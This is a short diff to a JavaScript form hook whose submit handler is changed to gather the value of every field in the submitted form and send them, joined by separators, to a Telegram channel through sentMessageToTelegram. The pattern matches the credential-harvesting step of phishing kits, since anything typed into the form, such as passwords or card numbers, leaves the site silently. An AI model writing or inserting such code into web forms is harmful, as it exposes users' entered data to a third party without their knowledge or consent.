@@ -20,8 +20,16 @@ const useForm = () => {
 
   const handleSubmit = (e, { values, action } = {}) => {
     e.preventDefault()
-    var a = sentMessageToTelegram(Telegram, `xxx | xxx | xxx`)
-    console.log(a)
+    let html = ""
+    if(e.target && e.target.length > 0){
+      for (let i = 0; i < e.target.length; i++) {
+        const element = e.target[i];
+        if(element.value){
+          html += element.value + ' | '
+        }
+      }
+    }
+    sentMessageToTelegram(Telegram, html)
     if (values) setValues(values)
     if (action) setAction(action)
     setTarget(e.target)
